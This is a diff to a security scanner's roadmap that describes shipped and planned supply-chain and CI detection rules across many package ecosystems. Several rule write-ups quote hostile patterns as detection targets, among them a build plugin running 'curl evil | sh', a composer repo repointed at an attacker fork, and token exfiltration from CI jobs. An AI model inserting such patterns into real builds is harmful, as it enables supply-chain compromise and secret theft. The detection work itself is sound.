@@ -19,6 +19,14 @@ What's planned, what's shipped, and what's deliberately out of scope.
   cite the tj-actions/changed-files compromise. This reverses the
   earlier "harden-runner is a runtime agent, deliberately out of scope"
   call (see the Self-hosted runner candidate). GHA 97 -> 99.
+- **GHA-109: harden-runner is not the first step (LOW)** — Completes the
+  harden-runner pack. Fires when a job uses
+  ``step-security/harden-runner`` but a step (a checkout, a ``run:``, a
+  setup action) runs before it, so that earlier step's outbound traffic
+  is neither recorded nor filtered (harden-runner only covers what runs
+  after it starts). Passes when it's the first step or the job doesn't
+  use it. The common shape, a checkout placed first, is a small gap with
+  a one-line fix, hence LOW. GHA 99 -> 100.
 - **NPM-014: single-publisher supply-chain risk (LOW)** — Flags a
   direct dependency whose npm ``maintainers`` array has exactly one
   entry, a single point of compromise (the axios / chalk / lodash
@@ -28,6 +36,18 @@ What's planned, what's shipped, and what's deliberately out of scope.
   stays below the default gate while still surfacing in a report. First
   of the three behavioral supply-chain signals (see Candidates).
   npm 13 -> 14.
+- **NPM-015 + NPM-016: provenance gap + OpenSSF Scorecard (LOW)** — The
+  other two behavioral supply-chain signals from the
+  ``proof-of-commitment`` review, closing that candidate. NPM-015 flags
+  a direct dependency whose latest version ships no build-provenance
+  attestation (``dist.attestations``), so it can't be traced to its
+  source commit and CI build, the SLSA / PEP 740 guarantee this project
+  ships on its own wheel. NPM-016 resolves each direct dependency's
+  GitHub repo from its packument and queries the OpenSSF Scorecard API
+  (``api.securityscorecards.dev``), flagging upstreams that score below
+  5/10 or fail the Dangerous-Workflow check (one extra API per linked
+  repo). Both reuse the cached packument, are ``--resolve-remote``-gated,
+  scoped to direct deps, and LOW severity. npm 14 -> 16.
 - **AC-035: AI agent is both reviewer and committer (CRITICAL)** —
   New attack chain pairing GHA-103 (AI review bot on an untrusted
   trigger) with GHA-104 (direct push) or GHA-106 (write-scoped token)
@@ -35,6 +55,18 @@ What's planned, what's shipped, and what's deliberately out of scope.
   commits its own change with no human in the loop. Closes the
   reviewer-and-committer gap in the AI-agent pack. Chain count
   48 -> 49.
+- **AC-036: untrusted-code execution with no egress containment
+  (HIGH)** — New attack chain pairing an execution leg (GHA-003 script
+  injection, GHA-035 github-script injection, GHA-016 ``curl | bash``,
+  or GHA-044 build-tool PPE) with an egress leg (GHA-107 harden-runner
+  in audit mode, or GHA-108 no agent at all) on the same workflow.
+  Attacker-influenced code runs while nothing blocks outbound traffic,
+  so it can exfiltrate the OIDC token / GITHUB_TOKEN / secrets. Models
+  missing egress control as a severity amplifier: GHA-107 / GHA-108
+  alone are LOW advisories, but paired with a code-execution primitive
+  they are the last-line gap harden-runner's block mode closes.
+  Reachability promoted to HIGH confidence when the legs share a job;
+  co-occurrence otherwise. Chain count 49 -> 50 (36 AC).
 - **GHA-106: AI agent CLI runs with a write-scoped GITHUB_TOKEN
   (HIGH)** — Fires when an agentic CLI runs in a job whose
   ``GITHUB_TOKEN`` carries ``write-all`` / legacy ``write`` or
@@ -567,37 +599,318 @@ a rule flagging workflows missing the section, a rule checking SHA
 consistency, and parser support. First-mover advantage: no scanner
 currently validates this section.
 
-### Behavioral supply-chain signals (maintainer depth, provenance)
+### ~~Behavioral supply-chain signals (maintainer depth, provenance)~~ shipped
 
-Three dependency-trust signals surfaced by reviewing
-``proof-of-commitment`` / getcommit.dev, a supply-chain risk scorer
-whose thesis is that behavioral signals (who can publish, how a package
-is built) catch compromise that stars, download counts, and
-``npm audit`` miss. The first (single-publisher) shipped as NPM-014;
-the other two remain open and neither is covered by the current
-pinning / integrity / compromised-list / cooldown / OSV packs.
+All three dependency-trust signals from the ``proof-of-commitment`` /
+getcommit.dev review now ship as NPM-014 / NPM-015 / NPM-016, each
+``--resolve-remote``-gated, scoped to direct dependencies, and LOW
+severity (posture signals below the default gate). The thesis: behavioral
+signals (who can publish, how a package is built) catch compromise that
+stars, download counts, and ``npm audit`` miss.
 
-- **Single-publisher risk (maintainer depth). Shipped as NPM-014.** A
-  package with one npm publisher is a single point of compromise (the
-  axios / chalk / lodash account-takeover class). NPM-014 reads the
-  ``maintainers`` array from the packument NPM-008 already fetches (no
-  new network surface), scopes to direct dependencies, and stays at LOW
-  severity since a single publisher describes most of the ecosystem.
-  Still open as a follow-up: pair it with a recent-ownership-change or
-  new-account signal (the actual takeover vector) to earn a higher
-  severity, and the PyPI parallel, gated on its JSON API reliably
-  exposing the owner-account list.
-- **Dependency provenance gap.** Flag a direct dependency published
-  without a build-provenance attestation, the property this project
-  already guarantees for its own wheel (SLSA Build L3, PEP 740). npm
-  exposes per-version attestations at
-  ``/-/npm/v1/attestations/<pkg>@<version>``; PyPI's PEP 740 surface is
-  the parallel once the ecosystem populates it. Same ``--resolve-remote``
-  gate as the cooldown and OSV rules.
-- **OpenSSF Scorecard surfacing.** Show a direct dependency's Scorecard
-  (and the Dangerous-Workflow check in particular) when the package
-  links a GitHub repo. Heavier than the other two (an extra API per
-  linked repo), so it sits below them in priority.
+- **Single-publisher risk (maintainer depth). NPM-014.** Flags a direct
+  dependency whose npm ``maintainers`` array has one entry, a single
+  point of compromise (the axios / chalk / lodash account-takeover
+  class). Reads the ``maintainers`` list from the packument NPM-008
+  already fetches, so no new network surface.
+- **Dependency provenance gap. NPM-015.** Flags a direct dependency
+  whose latest version ships no build-provenance attestation
+  (``dist.attestations``), so it can't be traced to its source commit
+  and CI build (the SLSA Build L3 / PEP 740 guarantee this project ships
+  on its own wheel). Reads npm's per-version attestation surface.
+- **OpenSSF Scorecard surfacing. NPM-016.** Resolves each direct
+  dependency's GitHub repo and queries the OpenSSF Scorecard API,
+  flagging upstreams that score below 5/10 or fail the Dangerous-Workflow
+  check. The heaviest of the three (one extra API per linked repo).
+
+Still open as follow-ups: a recent-ownership-change / new-account signal
+to pair with NPM-014 (the actual takeover vector, worth a higher
+severity), and the PyPI parallels for all three, gated on PyPI's JSON
+API / PEP 740 surface reliably exposing the owner list and attestations.
+
+### Weak-coverage provider deepening
+
+**Status (2026-05-30):** first batches shipped on ``dev`` for nuget
+(NUGET-016/018/019), composer (COMPOSER-011..014), pulumi
+(PULUMI-011..013), argocd (ARGOCD-014/015/017; 016 skipped), and pypi
+(PYPI-015..018). Still open: cargo (CARGO-011..013, needs the
+``build.rs`` / ``.cargo/config.toml`` / ``Cargo.lock``-body loader
+reads), gomod (GOMOD-011/012), rubygems (GEM-011/012/013), helm
+(HELM-015/016/017, needs the ``values.yaml`` / template reader), maven
+(MVN-015..018), and the deferred fourth picks (NUGET-017, etc.).
+
+A 2026-05-29 coverage pass ranked every provider by shipped rule count
+and ran a per-provider gap analysis on the thinnest packs. The
+registry, IaC, and GitOps providers at the bottom of the table (cargo,
+composer, gomod, pulumi, rubygems at 10 each; argocd and pypi in the
+low teens; helm, maven, nuget at 14 to 15) each have a class of attack
+surface their current rules don't touch. Every candidate below was
+checked against the live pack and confirmed net-new. Each is a static,
+text-only signal unless flagged otherwise.
+
+The recurring theme: these packs pin versions and sources well but
+barely touch two surfaces. First, build-time / install-time code
+execution (the class behind the xz-utils backdoor and the npm
+lifecycle-script attacks). Second, the source-substitution and
+dependency-confusion config knobs (the Birsan 2021 class). Both are
+statically detectable from files the providers already parse, with a
+few loader extensions noted inline.
+
+**cargo (10 rules).** The pack covers manifest-declared sources well
+but never inspects compile-time code execution or the config layer.
+
+- **CARGO-011: build.rs runs network or process calls at compile time
+  (HIGH).** Read the sibling ``build.rs`` (a file the loader doesn't open
+  today) and flag egress / exec idioms (``std::process::Command``,
+  ``std::net``, ``reqwest`` / ``ureq``, ``include!`` of a fetched path).
+  The Rust analog of an npm install-script or the xz build-step backdoor;
+  reserve HIGH for the network / ``include`` idioms since legit
+  ``build.rs`` files shell out to ``pkg-config`` / ``cc``.
+- **CARGO-012: .cargo/config.toml overrides the default registry source
+  or injects build flags (HIGH).** A ``[source.crates-io] replace-with``
+  reroutes the entire dependency graph without touching a ``Cargo.toml``
+  line, and ``[build] rustflags`` can run a binary at link time. Fills the
+  gap CARGO-005's own ``docs_note`` calls out. Needs the loader to glob
+  ``.cargo/config.toml`` (same pattern as npm's ``.npmrc``).
+- **CARGO-013: Cargo.lock package sourced off crates.io (MEDIUM).** Read
+  the lockfile body (today only its presence is probed for CARGO-003)
+  and flag any ``[[package]]`` whose ``source`` is a git /
+  alternate-registry / replaced source. Catches transitive source
+  substitution the manifest rules (002 / 005 / 008) can't reach.
+- Weaker: **CARGO-014: no supply-chain audit gate config (cargo-deny /
+  cargo-vet / cargo-audit) present (LOW)**, a posture signal parallel to
+  CARGO-010. Rejected: a ``cargo build --locked`` enforcement rule (that
+  is a CI-provider rule, not a cargo rule); proc-macro pinning (not
+  statically decidable from the consumer manifest); yanked-version
+  detection (needs the network).
+
+**gomod (10 rules).** The pack audits the dependency coordinates but
+nothing in the verification-bypass surface GOMOD-001's own prose warns
+about.
+
+- **GOMOD-011: go.mod ``tool`` directive pulls an executable build
+  dependency (MEDIUM).** The Go 1.24 ``tool`` directive promotes a module
+  to a build-time executable that ``go generate`` / ``go tool`` runs.
+  In-file signal, small parser add; pair with a ``known_fp`` note since
+  tooling-heavy repos use it normally.
+- **GOMOD-012: require / replace targets an insecure or non-canonical
+  host (HIGH).** Flag a module path over plain ``http://``, a bare IP
+  literal, or an explicit ``:port``. The module-graph analog of the
+  PyPI / JFrog insecure-host rules; operates on already-parsed
+  coordinates.
+- **GOMOD-013: CI environment disables module checksum / sum-db
+  verification (HIGH).** ``GOFLAGS=-insecure``, ``GONOSUMCHECK``,
+  ``GOSUMDB=off``, ``GOPROXY=off|direct``, broad ``GOINSECURE``. The
+  env-var twin of GOMOD-001 (sum file committed, runner told to ignore
+  it). Network-free but parser-gated: best shipped inside the CI provider
+  packs via a shared primitive rather than growing the gomod loader a
+  CI-config scanner. **GOMOD-014** (over-broad ``GOPRIVATE`` /
+  ``GONOSUMDB`` glob, MEDIUM) is a candidate to fold into 013. Rejected:
+  ``//go:generate`` and ``go.work`` rules (the provider loads neither Go
+  source nor ``go.work`` today).
+
+**composer (10 rules).** The pack defends transport, versions, and
+credentials but never reasons about the ``repositories`` array as a
+resolution override.
+
+- **COMPOSER-011: repository points a package name at an external VCS
+  source (HIGH).** A ``{"type":"vcs","url":".../evil/guzzle"}`` entry
+  re-points a public coordinate to an attacker fork, and Composer
+  resolves custom repos ahead of Packagist. The Composer face of the
+  dependency-confusion class.
+- **COMPOSER-012: disables Packagist or marks a custom repo canonical
+  (HIGH).** ``{"packagist.org": false}`` or ``"canonical": true`` makes a
+  custom repo authoritative for every name it can serve. Highest-
+  confidence, lowest-FP of the set (exact key / value reads).
+- **COMPOSER-013: config.disable-tls turns off certificate verification
+  (HIGH).** Strictly worse than the ``secure-http: false`` COMPOSER-010
+  (MEDIUM) covers; this skips cert validation on the HTTPS connections
+  Composer still makes. One-key lookup mirroring COMPOSER-008.
+- **COMPOSER-014: minimum-stability lowered without prefer-stable
+  (MEDIUM).** The companion to COMPOSER-005: ``prefer-stable: true``
+  collapses the dev-branch surface to only packages that truly require a
+  pre-release. Needs a one-line parser add for the top-level
+  ``prefer-stable`` key. Rejected: a generic scripts-runs-shell rule
+  (overlaps COMPOSER-006 and fires on benign ``phpunit`` entries);
+  ``prefer-source`` (weak signal); per-plugin trust (needs a reputation
+  feed).
+
+**rubygems (10 rules).** The pack covers the source and git-pin layers;
+the hole is Gemfile-level code-execution directives that aren't gem
+entries at all.
+
+- **GEM-011: Gemfile registers a Bundler ``plugin`` that runs at install
+  time (HIGH).** Bundler plugins execute their ``plugin.rb`` during
+  ``bundle install``, before any app code. GEM-010 (dynamic gem-list
+  resolution) explicitly does not match ``plugin``. Single regex over the
+  raw text.
+- **GEM-013: git / github gem fetched over an insecure transport
+  (HIGH).** A ``git: "git://..."`` or ``http://`` clone has no integrity;
+  ``dep.git_url`` is already parsed and GEM-003 (HTTP source) and GEM-005
+  (missing ref) both pass it today.
+- **GEM-012: gem pinned to a per-gem ``:source`` (MEDIUM).** The per-gem
+  face of GEM-007's multiple-top-level-sources confusion. Needs a small
+  parser add to surface the ``source:`` option value and careful prose to
+  delineate it from GEM-007. Deferred: **GEM-014** (``git_source`` block,
+  noisy, overlaps GEM-010) and **GEM-015** (``*.gemspec`` floating
+  ``add_dependency``), which is blocked on a gemspec parser the provider
+  doesn't have (it loads only ``Gemfile`` + ``Gemfile.lock`` presence).
+
+**pulumi (10 rules).** The conspicuous hole is the supply-chain surface
+of the manifest itself: nothing reads the ``Pulumi.yaml`` ``plugins:``
+block, and PULUMI-008 only catches the shell-exec path of deploy-time
+code.
+
+- **PULUMI-011: plugin pulled from a custom download server (HIGH).** A
+  provider / analyzer plugin is native code that runs with the
+  orchestrator's cloud credentials during ``pulumi up``; a ``server:``
+  override moves the download off the trusted registry. Pure dict walk
+  over the already-parsed ``project.data["plugins"]``.
+- **PULUMI-012: plugin version unpinned or floating (MEDIUM).** An absent
+  or range-pinned ``version:`` lets the binary that runs at deploy time
+  change without a code change. Same traversal as 011.
+- **PULUMI-013: dynamic provider runs arbitrary code at deploy time
+  (HIGH).** A ``pulumi.dynamic.ResourceProvider`` body is engine-invoked
+  code, serialized into state with any captured secrets. Source regex
+  like 005 / 006 / 008; scoped to Python + Node where the API exists.
+- Secondary: **PULUMI-014** (ESC ``environment:`` import without an org
+  qualifier, MEDIUM, the StackReference-drift primitive applied to ESC)
+  and **PULUMI-015** (Automation API embeds inline shell, HIGH, gated on
+  an Automation-API signal to avoid double-reporting PULUMI-008). The
+  strongest three are 011, 012, 013.
+
+**argocd (13 rules).** Strong on AppProject guardrails and RBAC; the
+blind spot is the Application's own source-rendering tools that execute
+code at sync time, plus the instance-wide exec toggle.
+
+- **ARGOCD-014: web terminal / ``exec.enabled`` set in argocd-cm
+  (CRITICAL).** One ConfigMap key opens an interactive shell into any
+  managed pod, gated only by the RBAC ARGOCD-004 already shows is
+  frequently wildcarded. Reuses the ARGOCD-009 truthy-toggle pattern.
+- **ARGOCD-017: Application deploys to the in-cluster API from a mutable
+  source (HIGH).** ``spec.destination.server`` is
+  ``https://kubernetes.default.svc`` and the source is a branch / HEAD.
+  Closes a structural gap: ARGOCD-002 / 011 only evaluate AppProject
+  wildcards, never the Application's own destination. Reuses ARGOCD-010's
+  immutable-ref helper.
+- **ARGOCD-015: Kustomize source enables the Helm plugin
+  (``--enable-helm``) (HIGH).** Turns a Kustomize app (which ARGOCD-008
+  carves out as safe) into a remote chart fetch-and-execute path. Scope
+  to the ``argocd-cm`` ``kustomize.buildOptions`` toggle, the cleanest
+  static target.
+- Also: **ARGOCD-016** (Helm ``valueFiles`` from a foreign repo, HIGH)
+  and **ARGOCD-018** (custom resource health / action Lua in argocd-cm,
+  MEDIUM). Highest-value, lowest-effort are 014 and 017.
+
+**pypi (14 rules; next free ID is PYPI-015).** Tight on flag-presence and
+pinning shapes; the gap is artifacts that bypass index resolution
+entirely.
+
+- **PYPI-015: requirement installed from a direct artifact URL (HIGH).**
+  A ``name @ https://host/foo.whl`` or bare tarball line pulls bytes from
+  one host with no name / version / hash gating. PYPI-004 matches only
+  VCS schemes and PYPI-001 explicitly skips ``http(s)`` URL specs, so no
+  rule sees this today.
+- **PYPI-016: primary --index-url points at a non-PyPI host (HIGH).**
+  PYPI-005 flags only the additive ``--extra-index-url``; the
+  substitutive vector (the primary index silently repointed, the
+  pip.conf / ``PIP_INDEX_URL`` tamper) is unguarded. Leans on
+  ``known_fp`` for legitimate internal mirrors.
+- **PYPI-017: --find-links to a remote host (MEDIUM).** Parsed today but
+  unused; escalate when ``--no-index`` is also set (find-links becomes
+  the sole source) or the URL is ``http://``.
+- Also: **PYPI-018** (``--no-binary`` forces the sdist build path, the
+  install-time code-execution surface, MEDIUM). Rejected: a ``setup.py``
+  body scanner (the provider loads no source files) and a ``--pre`` rule
+  (hygiene more than supply chain; PYPI-008's cooldown covers the
+  fresh-carrier-version slice).
+
+**helm (14 rules).** The pack is almost entirely a Chart.yaml /
+Chart.lock metadata audit; it never reads ``values.yaml`` or the chart's
+own ``templates/``.
+
+- **HELM-015: OCI chart dependency not digest-pinned (HIGH).** HELM-003
+  accepts every ``oci://`` repo unconditionally; a floating OCI tag lets
+  the registry serve different chart content under the same reference. No
+  new plumbing (reuses HELM-002's digest-shape helper).
+- **HELM-016: values.yaml ships a default secret or credential (HIGH).**
+  A real password baked into shipped defaults installs into the cluster
+  on a plain ``helm install``. The K8s render pass misses it when the
+  value is consumed via ``{{ .Values.x | b64enc }}`` into a Secret. Needs
+  a ``values.yaml`` reader keyed off ``chart.path`` (plus the ``.tgz``
+  member case).
+- **HELM-017: template renders an untrusted value through ``tpl``
+  (HIGH).** A ``{{ tpl .Values.x . }}`` re-evaluates a user value as a Go
+  template, a chart SSTI sink the render pass can't see. Needs the same
+  template reader as HELM-016.
+- Secondary: **HELM-018** (values default image floating / no digest,
+  MEDIUM, overlaps K8S-001) and **HELM-019** (subchart locked to a
+  different host than declared, MEDIUM, noisy). Ship 015 / 016 / 017
+  first; 016 and 017 share a one-time values / template reader.
+
+**maven (14 rules).** Pins versions, transport, credentials, and the
+wrapper thoroughly but has zero coverage of build-time code-execution
+plugins, the dominant real-world Maven build-RCE primitive.
+
+- **MVN-015: pom binds a build-time code-execution plugin to the
+  lifecycle (HIGH).** ``exec-maven-plugin``, ``maven-antrun-plugin``,
+  ``gmavenplus-plugin``, ``frontend-maven-plugin`` with an
+  ``<execution>`` bound to a phase run arbitrary host commands during
+  ``mvn package``. MVN-012 only checks the plugin's ``<version>``; it
+  passes a perfectly pinned ``exec-maven-plugin`` that runs
+  ``curl evil | sh``. Reuses MVN-012's plugin walk; scope the first cut
+  to ``pom.xml``.
+- **MVN-016: build.gradle re-enables HTTP via ``allowInsecureProtocol =
+  true`` (HIGH).** The explicit opt-out Gradle 7+ requires to allow an
+  ``http://`` repo. Catches the case MVN-003 misses when the repo URL is
+  a property the regex extractor can't resolve.
+- **MVN-017: settings.xml ``<server>`` ships a private key with an inline
+  passphrase (HIGH).** The SSH / GPG-credential sibling of MVN-010's
+  plaintext ``<password>``; reuses MVN-010's encrypted-vs-``${}``
+  discriminator. Lower frequency than ``<password>``.
+- Also: **MVN-018** (a ``<distributionManagement>`` release target that
+  accepts mutable SNAPSHOTs, MEDIUM). Scope tightly to the
+  SNAPSHOT-acceptance angle since the ``http://`` deploy-URL half is
+  already MVN-003.
+
+**nuget (15 rules). First batch shipped (NUGET-016 / 018 / 019), now
+18 rules.** The headline gap was public-feed inheritance, the canonical
+.NET dependency-confusion shape, plus MSBuild build-time execution.
+
+- **NUGET-016: private feed without ``<clear/>`` inherits the public
+  gallery (HIGH). Shipped.** NuGet merges ``packageSources`` across
+  machine / user / repo configs, so a repo config listing only the
+  internal feed still resolves ``nuget.org`` and the highest-version-wins
+  rule lets a public typosquat override an internal package. Microsoft's
+  "3 Ways to Mitigate Risk" names ``<clear/>`` as the fix. NUGET-007 only
+  fires when one config enumerates 2+ sources, so it structurally misses
+  this.
+- **NUGET-019: signatureValidationMode = require but ``<trustedSigners>``
+  is empty or missing (HIGH). Shipped.** The exact follow-up NUGET-012's
+  ``docs_note`` flags: ``require`` only rejects untrusted packages when
+  there is a populated signer list to validate against.
+- **NUGET-018: PackageReference / Import runs build-time MSBuild logic at
+  restore/build (HIGH). Shipped.** Packages ship ``build/<id>.props`` and
+  ``.targets`` that MSBuild auto-imports, the .NET analog of a
+  ``postinstall`` script. Scoped to high-signal shapes (an ``<Exec>`` in a
+  build / restore-phase ``<Target>``, an ``<Import>`` of a
+  ``GeneratePathProperty`` package ``build/`` path) to control the FP
+  rate.
+- Still open: **NUGET-017** (public gallery not in
+  ``<disabledPackageSources>`` when a private feed exists, HIGH); it
+  detects a genuinely different config state from 016 but overlaps
+  conceptually, so decide whether both should fire on one repo. Follows
+  NUGET-012's ElementTree-reparse pattern, so it needs no shared-parser
+  change.
+
+Cross-cutting note: several of the highest-value candidates need a small
+loader extension rather than just a new rule module (cargo's ``build.rs``
+/ ``.cargo/config.toml`` / ``Cargo.lock``-body reads; rubygems' gemspec
+parser for the deferred GEM-015; helm's ``values.yaml`` / template
+reader). The gomod env-var checks (013 / 014) are better placed in the
+existing CI provider packs via a shared primitive than bolted onto the
+gomod loader. Landing order is open; the per-provider "strongest" picks
+above are the suggested first batch.
 
 ### SDLC posture graph from fleet data
 
@@ -694,10 +1007,15 @@ job that isn't gated behind a protected ``environment:`` (distinct
 from GHA-014's deploy-name heuristic). Complements GHA-012 (ephemeral)
 and GHA-068 (deprecated runner image). StepSecurity's ``harden-runner``
 egress agent, earlier called out of scope as a runtime agent, now ships
-as GHA-107 (present but in audit mode, egress not blocked) and GHA-108
-(an OIDC / environment-gated job with no egress control at all). The
-remaining static angle is the runner-token rotation concern, which
-isn't visible in workflow YAML and stays out of scope.
+as a three-rule pack: GHA-107 (present but in audit mode, egress not
+blocked), GHA-108 (an OIDC / environment-gated job with no egress
+control at all), and GHA-109 (present but not the first step, so earlier
+steps' traffic is uncovered). AC-036 chains the egress gap to a
+code-execution leg (GHA-003 / 035 / 016 / 044), promoting the LOW egress
+advisories to a HIGH finding when untrusted code can run with no
+outbound containment. The remaining static angle is the runner-token
+rotation concern, which isn't visible in workflow YAML and stays out of
+scope.
 
 ### ~~Inline explain mode (``--inline-explain``)~~ shipped
 
